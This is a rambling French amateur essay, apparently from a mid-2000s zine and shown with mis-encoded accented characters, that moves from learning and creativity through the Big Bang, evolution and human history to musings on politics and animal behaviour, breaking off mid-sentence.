ΘlΘments clΘs de   ce  qu'une   situation  a   α nous offrir, avec le temps les connaissances 
pertinentes ne servent qu'α amΘliorer l'incertitude fondamental de la courbe d'apprentissage.


Vous vous tapez une game de counterstrike (ici exemple vaste tirer d'un jeu  bien  connu  ... 
(tant  quÆα  prendre  un exemple),  il vous   faut  en  tant  que  noob,  utiliser vos points  
d'adaptations pour manier  les armes, se  familiariser avec les touches de facon  symbiotique 
puis  ensuite il  faut Θmuler  le "tirer  sur  l'autre de  facon efficace"  en se  servant de  
tout ces  jeux passΘ  qui ont un principe plut⌠t similaire, mais ou  la  dynamique  du  jeux,  
du engine est diffΘrents, ici on  peut dΘceler que  l'apparence d'une courbes de connaissance
est dΘjα re-introduite  comme ΘlΘment d'adaptation affin de gagner du temps de spΘcialisation 
avec se nouveau engine,  puis  viens  ensuite  le dΘfi de connaεtre les maps, en soit le mΩme 
test que des milliers de rats on fait bien avant vous. Vous  vous  rappelez la vitesse qu'ils 
ont mis α les apprendre!? Non mais pour  la grosseur de  cerveau et  la comparaison  associΘe 
je  crois pas  que ce  sois un problΦme  pour  le commun  des  mortels. Ce  qui  faut retenir  
c'est peut-Ωtre justement la facilitΘ qu'on a α se mouvoir dans un environnement restreint et  
α mΘmoriser des ΘlΘments de dΘcors affins de s'introduire dans un monde virtuel et s'y sentir  
en contr⌠le. Puis viens  finalement les dΘtails superflues qui sont paradoxalement les points 
clΘs du jeu, comme poser un c4 α un endroit donnΘe.

Ou pensez α tous ces clowns  de cirque qui sont en  Θquilibre debout sur un  uni  cycle,  une 
tache  impossible pour le  commun  des  mortels,  et  qui  par  la  simple  pratique  devient 
envisageable. Imaginez le  nombre de traitement que le  cerveau d'une personne comme  ca doit 
faire  pour Ωtre en  Θquilibre... tellement il ne pense α  rien.. il  ne fait  que sentir  le 
moment  dans sa  tΩte.. comme si le cerveau   processerait  tellement  d'information  et  que  
la pratique serait tellement aboutie, que les informations nΘcessaires α l'accomplissement de
l'action  serait  intΘgrΘes  dans  son  cervelet  directement  au  centre  de  toute  actions 
coordonnΘes destinΘ α le maintenir en Θquilibre, tout ca dans une  boite  de 15cm2. Et si  on 
dis α ce  gars la de faire  la mΩme opΘration, mais  dans un endroit ou il devra combattre un 
vent  de 40 Km/h de l'est, naturellement il  va  essayer de compenser avec toute la  pratique 
qu'il a cet nouvelle contrainte et il est ici mieux placer que n'importe qui pour rΘussir. Le 
sens du dΘfi pour lui  rentre  en  ligne  de compte α se  moment prΘcis, le reste Θtait de la  
pratique la  il faut se fier sur la pratique, et l'adaptation spontanΘe α une contrainte. YÆa
beaucoup  de  personnes  dans  le monde qui nous font mΘditer sur le pouvoir  limitΘ du corps  
humains,  et  α  quel  point ils rΘussissent  α  faire des mouvements  et articulations  avec 
une  tel machine,  d'autre se  contente d'utiliser que le raisonnement d'une tel machine,  et 
pour en venir  α raisonner sur des  concepts divers, on se doit bien de le faire dans un lieu 
et un moment prΘcis sur terre;)

Importance du lieu de  la crΘation, par ceci  je tiens  simplement  α  exposer  que  certains 
lieux sont plus propices α la stimulation intellectuelle, ou sont plus Θvocateurs de passions  
instantanΘs, en plus le lieu en question peut Ωtre investi de  plus de  chaos qu'un  sous-sol 
en  bΘton froid...  tout  ce  chaos  qui  incite votre esprit α divaguer sur  divers ΘlΘments 
qu'il Θvoque. Le but est en fait peut-Ωtre plus de s'immerger  dans  des  situations remplies  
d'ΘlΘments  imprΘvisibles  (α  un  certain niveau)  ou la  profondeur d'un  texte aura  comme
renfort l'ΘlΘments de l'analyse d'une parcelle de chaos. La loi de Murphy est en soit un truc 
pessimiste, mais si on cherche α trouver son cote positif,  souvent confondu avec le  destin, 
on y trouve l'opportunisme qui  est la clΘ qui ouvre l'option d'agir sur un ΘvΘnement donnΘe, 
le choix reviens encore au dΘtenteur de  cette clΘ, choix ΘphΘmΦre la  plus pars du temps. Et  
si on divague sur le  sens  mΩme   de  la  mΘtaphore  de la  clΘ,  outil  important  mais pas  
nΘcessairement  essentiel  pour ouvrir une porte (porte  frontiΦre qui nous sΘpare d'un point  
de vue essentiel α la quΩte de nos but et envies). La clΘ en soit est le moyen   qui  combine 
efficacitΘ et rapiditΘ, situation parfaite qui sert bien un opportuniste  averti,  par contre  
le lockpiking  ou le  dΘvissage de  serrure permet  souvent d'obtenir le mΩme rΘsultat. HΘlas 
le temps est une contrainte  importante  surtout  qu'il  faut  complexifier  de  beaucoup une  
situation idΘale,  ne serait-ce  qu'en  temps  immΘdiat  et  prΘalable..  Donc l'opportuniste  
averti  α  avec  sois  des  ΘlΘments  qui tiennent plus de  la statistique  que du  pratique, 
les  occasions chaotiques  se  doivent   d'Ωtre   rΘpertoriΘs,   cataloguΘs,   analysΘs    et
expΘrimentΘs...  affins  de  les   re-rΘpertorier,   re-cataloguer,   re-analyser    et   re- 
expΘrimenter... tout ca  dans le but  de les re-re-rΘpertorier,  etc ... de  ces statistiques 
ΘpurΘs on en arrive α un niveau d'incertitude non concluant qui par  dΘduction est  la limite  
de l'application aprΦs X  essai d'une situation. Si  X  est  augmentΘ   pour  comprendre   un 
ensemble  plus vaste, et que la situation  final reste invariable, on α atteint ce qui semble 
bien Ωtre une Θvidence. Les  moeurs  et  coutumes  varissent  entre plusieurs pays, plusieurs 
continent, alors il serait  judicieux  d'expΘrimenter dans un monde local affins de roder vos 
thΘories  avant  de  les  exposer au monde!.. Mais avant de les exposer au monde, il faudrait  
peut Ωtre avoir une idΘe plus objective de ce quÆil reprΘsente..

Comme toute bonne histoire a un  dΘbut, ou du moins une situation  initial, je vais enchaεner  
avec les  connaissances que  lÆon a  du monde  qui nous  entour,  depuis le dΘbut ou ces mΩme 
connaissances   nous  permettent  dÆextrapoler,   c'est-α-dire  le  Big-Bang.  Cet  ΘvΦnement 
mystΘrieux, et α la fois essentiel α notre quΩte de connaissances, a pris place il y a jadis, 
15 milliard dÆannΘesà  sa fait un  bout de temps, mais notre bonne  vielle terre a quand mΩme 
5  milliard dÆannΘes,  en  somme, temporelment parlant, cÆΘtait il  y a pas si longtemps ;)à  
surtout si  on  extrapole que lÆunivers α encore un  bon bout de temps  devant lui, plus  que
vous en  avez entk  ;). La  thΘorie va  comme suit,  de rien, est nΘe lÆuniversà simple  non?  
On α  tous entendu  cette histoire,  mais dans  les faits,  cÆest possible ? Toute  lÆΘnergie 
et  la   matiΦre  de  cet  UNIVERS,  mΩme  les  bouts  que  lÆon  ignore de ce qui le compose 
actuellement, (et on est encore plut⌠t ignorant),  Θtait  jadis packer  α un  point tangible,  
et rΘel  de ce monde qui sÆappelait pas encore lÆUnivers. En fait ce qui se passe avant cette  
Θpoque et  purement  inconnue,  et  nÆest  peut-Ωtre  vouer quÆα  enrichir la  crΘativitΘ  de
nombreuses  espΦces  intelligente  par  de  belles  spΘculations,   spΘculations ironiquement  
faite  par  de la  matiΦre  et  de lÆΘnergie  venant  de  ce point  existentiel de la vie. En 
fait,  le mystΦre est complexe, soit, la   notion mΩme  du  temps  prend  ses  racines  α  ce 
moment  mΩme de  la crΘation,  distorsionnΘ α souhait par toute cette prΘcaritΘ de matiΦre et 
cette tempΘrature extrΩme.  Mais  cette  anomalie  en avait assez un jour de tourner en rond, 
donc elle α  explosΘe, pour le plus grand bonheur de tout  le monde finalement.. (avec un peu 
de  recul  on  le  voit bien ) ;) .. De  *rien*, sÆest entamΘ lÆoeuvre le moins lΓche qui ait
jamais existΘ,  Les notions  mΩme de  la physique  se sont  rΘvΘlΘs α ce moment, lÆespace, la 
matiΦre,  lÆΘnergie, le temps,  surtout le temps,  puisquÆil est en  soit  la  crΘation   qui 
garantie tout les autres.

Puis  sÆen  suit une  Θvolutions  de la  force,  dÆune super  force,   lÆunivers  explose  en 
donnant naissance α dÆautres forces qui encore aujourdÆhui  rΘgissent encore nos vie.  DΦs sa 
crΘation,  la gravitΘ sÆimpose  dΘjα comme une  force α part entiΦre, tendis que   les forces  
ΘlectromagnΘtiques,  nuclΘaire    (forte, et faible) sont  mixer ensemble  dans   une seconde  
force   qui les   unifies  toutes..  Puis,   α  10^-35  secondes, la  force nuclΘaire   forte 
se sΘpare  du groupe de force unifiΘe.   On a maintenant 3  forces prΘsentes, la gravitΘ,  la
nuclΘaire forte, et encore ce mixe de forces ΘlectromagnΘtiques et de force nuclΘaire faible.  
Puis vers  10^-11 secondes, la  force  nuclΘaire  faible  et  la  force  ΘlectromagnΘtique se  
sΘparent en  ce qui  sera respectivement  la   mΩme   chose,  mais  sΘparer ;). Voilα donc le   
dΘbut des forces  fondamentals   de  la physique,  le  tout  dans  un  dΘlais  de  temps  que 
lÆinformatique  actuel  ne parvient pas a ΘgalΘ.

Puis, lÆespace en tant quÆentitΘ sÆest  mise α sÆexpandre α une vitesse   folle. Mais le tout 
dans une Θchelle   de  temps  tout  aussi  dΘment.  DΦs  lÆexplosion,  la  tempΘrature  Θtait  
extrΩmement ΘlevΘ, les particules de matiΦres et dÆanti matiΦres ont  livrΘe  leurs  premiΦre 
bataille  en rΦgle  α ce  moment, α  10^-43 secondes, dΘjα le tout commencait α ce refroidir,  
la matiΦre  sÆest mise   α  prΘdominer sur lÆanti-matiΦre, par le lot incroyable dÆune partie 
par   milliard de  particule.. :).   LÆunivers a  rΘussis le  test de  la crΘation,  en ne se
dissolvant pas lui-mΩme par lÆanti-matiΦre. Puis lÆexpansion se poursuit  α  10^32  secondes, 
avec   la naissance   de quarks,   de neutrinos,   dÆΘlectrons et de photons,  des particules  
encore  loin du  noyaux  atomique  que  lÆon  connais  actuellement, mais  α une  tempΘrature 
de  10^27 degrΘs  Celsius, on  peut  Ωtre  tolΘrant.  └  10^-6 sec, 10^13 degrΘs, les premier 
protons et neutrons font  leurs  apparition dans ce  qui Θtait le  vide, une premiΦre.  Apres 
3 minutes  de  vie, dΘjα les premiers  ΘlΘments  dÆhydrogΦne  faisait leurs  entrΘes,  suivit  
par  lÆhΘlium.  Puis  300 000  ans  plus  tard, (ce  qui est encore relativement   bien), les  
atomes  dÆhydrogΦne et  dÆhΘlium  ont officiellement  leurs  Θlectrons qui gravitent autours, 
lÆunivers se refroidit, plus que 10 000 degrΘs Celsius.  Puis un milliard  dÆannΘe plus tard, 
α  -200 degrΘ  C. ,  la gravitΘe condense   les  nuages  de gaz qui parcoure lÆunivers encore 
prΘcaire, des amas de particules se rapprochent, sÆΘchauffent et crΘe les premiΦres galaxies,  
et  les  premiers soleils de ce monde.

A  cette  Θpoque,  lÆespace  est  encore relativement minuscule, pourtant tout de qui compose 
lÆunivers encore de nos jours devait thΘoriquement sÆy trouver, sous une  forme ou une autre, 
notre soleil, notre terre, les particules qui vous  compose, de  facon encore  bien primaire,  
non transformΘes  par les  milliards  dÆannΘes dÆΘvolutions qui vont suivre. CÆest en quelque 
sorte lÆunion entre  lÆinfiniment  petit  et lÆinfiniment grand qui prend sa source ici, dans 
cet amas de gaz encore  tΘnΘbreux.  En  fait on peut  mΩme  dire que  philosophiquement  α se  
moment  de lÆexistence mΩme de lÆunivers, tout le potentiel de la vie futur Θtait en train de 
prendre  naissance,  par  la  complexitΘ  des  forces  qui  allait bΓtir par la chaleurs, les  
ΘlΘments, les  particules, cette  vie non  seulement futur,  mais probablement gΘnΘraliser  α  
plusieurs autres  espΦces  que  lÆΩtre humains,  α  travers  lÆunivers en entier, laissant la 
voie ouverte α la crΘativitΘ de  divers Ωtres pensant capable dÆapprΘcier le processus ultime 
de la crΘation,  peut-Ωtre mieux que nous mΩme a lÆheure actuel..

Cette Θvolution va sÆexpandre encore et encore, donnant naissance α des  soleils massifs  qui 
exploseront  pour libΘrer  des mΘtaux  lourds. De  la  mort  de  ces  Θtoiles  prΘcurseur  se 
cache une transformation de lÆhydrogΦne en hΘlium, en carbone, en oxygΦne, puis en silicium.. 
et finalement en fer.  Fer une  matiΦre  stable  qui  ne  peut  Ωtre fusionnΘe  pour crΘe  de 
lÆΘnergie.  La matiΦre ainsi expulsΘe du  corps mΩme  de lÆΘtoile  (et de  ce qui  lÆentoure) 
se  rΘpand dans  lÆespace encore une fois, dissipant  sa matiΦre sur des milliards  dÆannΘes.  
Et cÆest cette matiΦre lα qui, 5  milliards dÆannΘes plus tard, crΘe notre  systΦme  solaire, 
puis  les planΦtes  qui lÆentourent,   crΘe par lÆamoncellement de la matiΦre qui se condense  
en des points gravitationnelle. Ces  particule de matiΦres soumises α des forces de  pression 
et de gravitΘe extrΩme dΘgagent  une  chaleur,  chaleur  qui  encore de nos  jours continue α 
alimenter le soleil,  et le  c£ur de cette bonne vielle terre. Mais cette vision du monde est 
encore une fois bien relative, car au mΩme moment  α  lÆautre  bout  de  lÆunivers,  le  mΩme  
scΘnario  se  perpΘtue  sans  arrΩt, en se moment mΩme. Puis, ces soleils tout comme le notre
crΘe au fils  du hasard du  dΘplacement des masses, et des gaz  qui les formes, sont des fois 
simple, double, ou mΩme tripleà pourquoi pas quadruple.. qui  sait  ce  que  le  hasard  peut 
accomplir  statistiquement avec  comme limite un nombre infini dÆΘchantillons. Dans notre cas 
cependant, le hasard, backer par  beaucoup  de  physique  ΘlΘmentaire,  a permis α une petite 
planΦte de roche, qui est  situΘe dans lÆΘcosphΦre  du soleil,  une limite  ou en  gros lÆeau  
peut sÆΘvaporer, et  geler,  qui  permet α ce quÆon nomme  la vie, dÆexister, enfin α ce jour  
cÆest la conclusion. Il est aussi intΘressant de noter  que  cette  petite  boulle  bleue, la 
Terre, doit son champ  magnΘtique α la  rotation  α  son  centre  de  mΘtal  (fer) en fusion.   
Champ  magnΘtique  qui  sÆavΦre  trΦs  utile  pour  supporter  la vie,  en dΘviant des rayons 
cosmiques qui Θmanent du soleil.

Mais la vie en tant que telle sÆavΦre une mystΦre encore entier, lÆamoncellement  de carbones 
et dÆacides aminΘes, dans un milieu aquatique primaire, est en  soit  plut⌠t  prΘcaire  comme  
explication, tout comme  la mΘtΘorite venant  de lÆespace  porteur  de  vie  il y a de ca 3.6 
milliard dÆannΘes. LÆADN dΘfinie, de facon  trΦs microscopique  mΩme α cette Θpoque,  un gage  
de survie  de la  vie  elle-mΩme, encodant les spΘcifications pour crΘe  dÆautres entitΘs qui 
se dΘvelopperont   α  leurs  tours. Les algues  se multiplie, et donne  par le fait mΩme  une 
source  de  nutriment  α  dÆautres espΦces  plus ΘvoluΘe.  La vie  se sert  de lÆoxygΦne pour
accroεtre son  potentiel ΘnergΘtique,  puis certaines  espΦces  sortent   de  lÆeau  pour  se 
perdre dans un monde encore vide dÆexploration. Le pouvoir de la vie est  en  soit un sujet α 
dΘbattre. LÆadaptation et lÆΘvolutions des espΦces en  rapport  α  leurs  besoins,  α   leurs 
environnements, comme si la vie ne voulait pas  mourir, en crΘant   des  mutations   au seins   
mΩme  des   entitΘs  quÆelle  crΘe,  la sΘlection naturelle  ou les  plus forts  survivent et  
perpΘtuent  leurs  gΦnes  α  lÆespΦce mutante ainsi super adapter. Il est aussi intriguant de 
voir en la  vie des constantes statistiques  bien   particuliΦres,  les   arbres  et   la vie
vΘgΘtal semble avoir  un  faible  pour  une  structure  de  type ½ branche,  feuille ╗ .. ces 
ramifications du  frame solide  vers dÆautres  frames moins solide, la logique derriΦre cette 
ingΘnierie naturelle est forte, elle permet α lÆarbre de grandir petit bout  par petit  bout, 
sans  que des  parties importantes   soient mises en pΘril  et  cause   la fin  de   lÆarbre,  
le  tout   en maximisant α lÆextrΘmitΘ de ses branches lÆexpansion de lÆespace. On note aussi 
que plusieurs animaux sur  terre on et on eu, deux yeux, un  nez, une bouche, des poumons, un
coeur,  un cerveau,  un coup, en  fait sa semble  Ωtre la norme  fondamental du gΘnome TERRE, 
pour  les entitΘs  importantes du moins. Une prise  de conscience se  fondant sur  des  faits  
statistiques qui  se   perdent   dans   les   abymes du temps. La  suite sÆaccΘlΦre   par une  
multiplication de   la vie  vΘgΘtale,  et animale, des  Ωtres de plus  en plus gros peuple ce  
monde, puis finalement  des Ωtres gigantesques,   et des  reptiles volant  sÆen donne α coeur  
joie pour se nourrir  de petits  mammifΦres.. Un   Θpoque qui  aurait  bien  pu  aboutir  aux
premier Ωtres   dotΘs dÆintelligence  proprement dite, mais un autre ΘvΦnement catastrophique
mis   fin α  cet essai  de la  vie,  un  essai tout  de mΩme trΦs  concluant.  Encore α cette 
Θpoque, des  dinosaures, ont du regarder la mΩme lune que nous voyons   3 semaines par  mois, 
ce quÆils  devait en conclure, rien de particulier peut-Ωtre.. mais   la lumiΦre qui  Θmanait 
de  celle  ci devait Ωtre en soit une   source de rΘconfort..    ( Qwzykx lÆami   des animaux 
ici..)  Puis aprΦs  une bonne  dose dÆΘvolution,  lÆΩtre  humain  vis le  jour,  cette   Ωtre
physiquement  plut⌠t  impotent,  qui  ne  possΦde  que  comme  seul avantage  un cerveau plus 
dΘveloppΘe, et une paire de  main,  a sus survivre α une Θpoque  ou  ses  moyens Θtaient plus 
que limitΘes, se  gossant des bouts de bois avec ce  qui  lÆentour pour chasser, et apprenant  
des anciens les rudiments de  la confection et du maniement des  armes, ainsi que comment  se 
gosser des pseudo-manteaux  de  poils, ou simplement comment apprΩter un  sanglier .. LÆhomme 
se prΩtait mΩme α des  excΦs  dÆintelligence et  de  crΘativitΘ en  peinturant  sur des  murs  
ses exploits, ces  quΩtes, ces  rΘussites,   il laissait derriΦre lui plus que son existence, 
mais  bien celle  dÆune Θpoque.(Noter ici  lÆancΩtre du  Zine),  mais ou des  signes de   ces 
artistes prΘcurseurs restent  encore  sous la  forme  de  dessins, ou  dÆartefact. Puis  plus  
tard  les clans, et  ensuite  les  sociΘtΘs se formΦrent.  Des   endroits ou   collectivement  
lÆΩtre  humain trouvait  un avantage  α sÆentourer du savoir des  autres. LÆΘpoque Θtait dur, 
et encore plus quand lÆhomme  nÆeu  que  lÆhomme  α  craindre.  DΦs  lors  la  quΩte  de   la  
connaissance pris un  rythme que ne devait plus ralentir,  sa survie en dΘpendait, quÆil   en
soit conscient   ou non.  Puis  les  annΘes passΦrent,  des territoires entiers firent partie  
de  lÆoeuvre  de lÆhomme,  des constructions  de moins en moins rudimentaire virent  le jour,  
de mΩme  que des  Θrudits de  lÆΘpoque. La guerre Θtait toujours  en arriΦre   plan, de  plus 
en  plus mortel,   et efficace, des lΘgions de personnes motivΘes par leur amour de la patrie 
(tien ca date  pas  de si t⌠t)  se  lancait  α  la conquΩte, ou   la dΘfense de  territoires.  
Des hΘros virent le jours, et moururent,  mais lÆoeuvre faite et accomplie  allait changer la 
gΘographie  politique du  monde pour  des annΘes  α venir.  A cette Θpoque  de  balbutiement, 
lÆhomme tentait  tout  de  mΩme  de  comprendre  le  monde  dans  lequel  il  vivait,  ce qui  
lÆentourait. La  philosophie grec,  Θpoque ou  la  masturbation intellectuel a belle  et bien  
dΘbouchΘe  sur  des principes   fondamentaux de la science actuel, que se soit  le fait   que 
tout  est composΘe de *grains de sables minuscules*  ou quÆil  ne faut   quÆun grand   levier 
pour   soulever   le   monde,   sans   parler  du   nombre  d'art  qui fut un  modele d'ideal 
mathΘmatique  ;)  IngΘnieux, on se demande mΩme comment par la nature de ce qui les entourait  
ces philosophes pouvaient en venir α de tel conclusions.. tout α fait juste ;).. Par  contre, 
on voit encore bien quÆun Einstein mΩme  α  cette  Θpoque  nÆaurait  pas  pus  dΘcouvrir  les   
fondements  de   la  relativitΘ,   les  stimulis   humains  qui  lÆentourerait α cette Θpoque 
de la  philosophie Θtait tout de mΩme limitΘes,  on  aurait  peut-Ωtre  mΩme  vu en lui quÆun 
piΦtre laveur de toge..

Puis par la suite, vint lÆΘpoque  de lÆexploration, des ΘpidΘmies, et encore  de  la  guerre. 
LÆhomme poussait  sans  arrΩte  sa  dΘcouverte   autant  scientifiquement,  techniquement  et 
socialement. On note aussi que la religion a ΘtΘ un moteur  non nΘgligeable pour la confiance 
de lÆhomme en de grandes causes. Cette  conception de la  vie aprΦs  la mort  est en  soit un  
rΘconfort  ultime  qui  devait  Ωtre  α  lÆΘpoque beaucoup plus tangible quÆen se  moment (et 
encore ..) . La  dΘcouverte du  nouveau  continent,  la colonisation de celui-ci de facon peu 
Θthique, mais oh combien efficace, le  dΘbut du commerce  international, et avant que lÆhomme 
de  lÆΘpoque  puisse  prendre  conscience   dans    toute    lÆignorance   qui   lÆentourait,
lÆindustrialisation, et  les bases  du capitalisme  firent partie  du quotidien. Puis vain la 
1ere  guerre   mondial,   une  Θpoque  ou  les technique de guerre furent  raffiner aux go√ts 
technologique du jour  de facon ingΘnieuse, une Θpoque ou  le  dΘveloppement   technologique,  
surtout  en matiΦre  dÆarmement,  fit  de grandes innovations, innovations essentiels α la 2e 
guerre mondial, ou des  technologies  exotiques  comme  les  avions,  sont  devenue  beaucoup  
plus  perfectionner, et  efficace. Ou le fondement mΩme de  la force contenue dans la matiΦre  
pris enfin  tout  son sens avec lÆapparition  de la  bombe nuclΘaire,  une bombe  somme toute
de faible magnitude (21 Kilotonnes)  si  on  la  compare  avec les innovations apportΘes lors 
de la guerre froide (51 MΘgatonnes), bombe-H, bombe  α neutron..  En  fait cette lubie de mad  
scientist prenait ici  un tournant  qui  laisse  un froid dans le dos, si la guerre  de jadis 
se passait  en  voyant  de  moins   en moins  le regard  de lÆautre,  cette fois il suffisait 
dÆΩtre α  des milliers de Km de distance  et de tourner  une clΘ pour dΘcimer une  population  
entiΦre  de  plusieurs  millions de personnes.  Puis viens paradoxalement  par  des  procΘder
similaires lÆexploration  spatial de  lÆhomme, premier  annimal  de  la terre α rΘussir cette 
exploit.  De quelques  tours autour  de  la terre, on  sÆest vite appropriΘ la lune,  pour la 
science,  et   aussi   quelques   notoriΘtΘs   politique.  Enfin,  la  suite  de lÆinnovation  
poursuivit  sont  cours,  avec  des  navettes  rΘutilisables, des lanceurs de  plus  en  plus  
perfectionnΘs,  des  sondes qui eurent pour but dÆexplorer des mondes si lointains,  mais  oh  
finalement combien  si   proche  aprΦs  tout..  sans oublier cette merveille technologique du 
monde  moderne.. le  bras  Canadien ;)  Et  nous voici en 2005  avec un  semblant de  station  
spatial  international   qui se  veut  un  lieu  de  dΘcouverte et dÆexploration scientifique 
et aussi avant poste ½ de  traite ╗ pour de futurs missions sur la lune, ou encore vers mars. 
Le besoin de lÆhomme α repousser  les  limites qui lui  sont donnΘes est  en soit une  oeuvre 
intrigante   de  la  vie,  de  lÆintelligence,  et de  lÆingΘniositΘ. Et  on voit  bien cette  
relation  par  la  complexitΘ,  et  la fonctionnalitΘ de plus en plus dΘfinie et prΘcises des  
outils  que  lÆhomme   continue  de  construire,  et  on  est  bon dans  les outils, car on a
vraiment  eu  le temps  dÆen  gosser  une couple  depuis lÆage  de pierre ;) En ce  dΘbut  de  
millΘnaire, on  est peut-Ωtre  une des  derniΦres gΘnΘrations  dÆΩtres humains α voir la lune 
encore inhabitΘe par lÆhomme de facon permanente, car il y a depuis dΘjα des annΘes au  moins 
quelquÆun  quelque part  qui dort   dans lÆespace ;).

Les  communications   explosent, lÆhomme   est  plus  individuel  que  jamais, mais solidaire 
nationalement,  quel ironie, quand  on pense que  dans  plusieurs pays le pouvoir est divisΘe 
entre  deux grand  choix de  gouvernement,  comme  si on  avait toujours  besoin dÆun  Yin et  
dÆun Yang  .. ne  serait-ce que  par dissuasionà La condition  de   lÆhomme  dans  lÆunivers,  
des   sentiments   de  celui-ci,  de  expΘrience  quÆune  personne moyenne  peut expΘrimenter  
dans une vie, de la mΘmoire  quÆil peut  emmagasinΘe,  de  la crΘativitΘ quÆil peut exprimer, 
tant dÆΘlΘment qui nÆont pas de limite national, tans  dÆΘlΘments  qui sont un  tΘmoignage de   
lÆΘtat de  mammifΦre engrosser  cervicalement qui  nous dΘcrit.  Le pouvoir  de voir  la  vie  
en se  basant  sur  les recherches    des autres, sur  la conception de  ce  qui nous entour, 
par la comprΘhension  et le raisonnement, cÆest  un aboutissement curieux quand  on y  pense, 
de   pouvoir admirer lÆunivers  avec le  peu dÆinformation  quÆon a  α cette Θpoque,  curieux
quand on pense quÆon est le 1er essai du raisonnement, le 1er essai que la   vie  a crΘe d'un 
Ωtre qui se dΘmarque des autres par une  capacitΘ de comprendre  et dΘcrire ce qui lÆentoure, 
le tout en ayant le choix de  changer par des   moyens  crΘatifs  son milieux,  une des rares  
espΦce α adapter  son millieux de  vie  au  lieux  de  s'adapter α celui-ci. Un Ωtre qui peut 
comprendre de  facon   physique  et philosophique  sa situation  dans le monde, ou simplement 
la notion mΩme du mot ½  monde ╗. Mais sommes  nous  si  brillant  aprΦs  tout,  est-ce   que 
lÆhomme est  digne   dÆΩtre vu   comme  un  model?  MalgrΘ le fait quÆon invente des voitures 
avec des  polymΦres de plus  en plus complexes,  des micro-ondes,  des processeurs de plus en   
plus nanoscopique..  le  fait  est  que  la  majoritΘ   des  gens  nÆont  que  faire de   tel  
connaissances,  lÆhomme moyen  ne   vise  quÆα  utiliser ce quÆon   lui offre, sans  trop  se 
poser  de question..  si   quelque  chose  brise,  on  va  chez  le  rΘparateur, qui lui-mΩme 
commande une piΦce  neuve, sans rΘparer lÆancienne piΦce qui  est dÆailleur fort probablement 
revendue   α une  compagnie  de  recyclage...  Ca   fait   de  nous,  du  systΦme   un   lieu
ou lÆintelligence humaine applique des connaissances   (plus  Θconomique quÆenvironnemental).  
Donc  est-ce   pour  son   propre bien  ou pour  le bien du  peuple quÆon tente de changer le 
½ monde ╗ ?

Les grands pionniers scientifiques sont les vrais artisans du monde effrΘnΘ technologiquement 
dans lequel nous vivons.. et  sa serait naif de dire que  tout le monde est Θgale, car par le 
sens mΩme des intΘrΩts qui motive chacun, on voit bien  que  certaines  personnes  manipulent  
ou  sont  manipulΘs,  avec  ou  sans  consentement.  La capacitΘ de raisonnement est aussi un 
facteur intrigant,  quand  on pense que la majoritΘ des personnes prennent un choix politique 
envers leurs prΘsidant/premier  ministre  la veille  mΩme  de lÆΘlection.  Se  basant sur  la
critique du dΘbats des chefs, ou le look de la personne, la dΘtermination  quÆil dΘgage. Mais  
dans les  faits on  peut avoir  un leader  amorphe, ce qui  compte cÆest les projets de  lois  
qui  en  dΘcoulent..  Les  speach  publique  sont  prΘfabriquΘs  de  toute  piΦces,  par  une  
armΘe  de  personnes  en   ôrelation diplomatiqueö dÆon le but est de plaire le plus possible 
α une masse de personne (dÆont le QI cible  est passablement  85) de  jouer sur  leurs peurs, 
sur leurs  espoirs  futurs,  la sociΘtΘ dΘmocratique est de plus en plus pleine de trous,  un
systΦme ou les erreurs superposΘes  se sont accumulΘes offrant α  une oligarchie  de personne 
la possibilitΘ de gouverner  un pays, α leurs intΘrΩts, incluant la vision  du  monde  quÆils  
offres  α  leurs  Θlecteurs.  Les  fonds privΘs sont essentiels  α  une  campagne  en  rΦgle,  
et  α  dΘfaut  de  pouvoir  avoir  des  investissements  que  par des  belles paroles,  cÆest 
par  lÆargent quÆon vient α  bout de faire plier des dirigeants  dÆentreprise en sa  faveur.. 
Un choix avare, mais payant,  surtout quand  on apprΘcie  toute la  dynamique de manipulation 
de masse derriΦre tout ca. L'intellect humain, aboutissement logique de la vie  (si on se fit 
α la logique qu'on en  connaεt) en fait la seule qu'on connaεt ;)  (ce  qui serait logique).. 
bon, si on  en revenait au sujet.. Cette intellect  qui me  pousse  α  Θcrire ce soir, vous α  
me lire, et bien d'autre α vider  des poubelles ou perfectionner un gΘnΘrateur  de plasma, on 
est tous aussi pertinent que des fourmis, et bien qu'on aime pas avoir le r⌠le de la fourmis, 
on l'assume  assez bien d'un tas de gens, (incluant tout ses inconnues au Mexique).  MΩme  la  
plus attruiste des  personne voit  par moment  ses semblables  comme des obstacles α eviter..  
Et  oui  vous  Ωtes  une  fourmi,  une  fourmi   de  plus  dans  cette  fourmiliΦre  humaine, 
votre race  est votre nationalitΘ,  votre territoire  aussi  dΘfinie  que  les  voisins   qui 
peuple dÆautres fourmiliΦre le veuillent bien. Le but est simple, ne   pas Ωtre  exterminer.. 
On  attend beaucoup  dÆune  fourmi,  beaucoup  trop,  beaucoup plus  que  ce quÆelle voudrait 
faire de sa vie, elle doit  travailler, apporter  de la  bouffe au  nid,  se   battre en  cas  
de danger,    et  malgrΘ  tout  elle   se promΦne    non chalament  dans  les  prΘs,  jusquÆα  
ce quÆun stimuli  extΘrieur vienne menacer   sa  vie, et mΩme α   cette  grosseur lÆesprit de   
survie est remarquable.  Je  mÆΘtonne des  fois  de  voir  des stratΘgies    diffΘrentes chez   
des  bestioles,  la fourmi  par exemple  va  fuir,  bouger  plus vite  pour se  sauver ou  se 
dΘfendre..  mais pour lÆaraignΘe la situation  est tout  autre,  plus   sneaky elle  va faire  
la morte, et elle est plut⌠t  convaincante, si ce  nÆΘtait de mon  excΦs de QI,  il sÆagit la 
dÆun truc  qui  marche  mΩme  avec  le  chien  le  plus  brillantà JÆcrois qui a un parallΦle 
α  faire avec  lÆespΦces humaine,  il y  a des  ces gens  qui vont se dΘbattre pour se sortir 
dÆune situation,  dÆautre qui vont simplement attendre dans le calme que la situation  passe, 
quel situation est la  meilleur, mystΦre, ca dΘpend de  la  situation   et de   votre  chance  
se  matin  la ;) CÆest passionnant de voir chez  des Ωtres plus petit  que son ongle, α  quel 
point des  comportements  de  la  vie  de  tout  les jours  peuvent  Ωtres  appliquΘs, α quel
point on peut  trouver une  rΘaction familiΦre, et comprΘhensible. MΩme  chez un chat on peut  
dΘceler ses  essais  de  ½ sneaky  cat  ╗  ou  ses  routines  de  nourriture,  ce  que  cette   
boulle de  poil  offre  de  plus  que  des  insectes cÆest une   communication comprΘhensible  
rΘciproque, simple  soit,  mais  quand  mΩme  prΘsente, quand il  vous regarde dans les  yeux 
en miaulant se tenant α un point prΘcis de votre  appartement, on dΘduit ce quÆil dΘsire,  ce 
quÆil  veux, et aprΦs  tout  s'il  nous  en  fait part,  cÆest quÆα  quelque part,  lui aussi
